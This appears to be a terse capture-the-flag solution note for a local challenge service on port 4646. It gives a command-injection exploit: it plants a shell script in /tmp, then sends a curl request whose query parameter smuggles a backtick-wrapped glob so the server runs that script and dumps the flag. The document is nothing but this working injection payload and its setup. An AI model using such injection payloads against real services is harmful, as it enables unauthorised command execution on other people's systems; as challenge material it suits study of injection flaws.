create /tmp/FILE and do ``curl 'localhost:4646?x=`/*/FILE`'``
FILE should contain something like

```Shell
#!/usr/bin/env bash
getflag > /tmp/flag
```
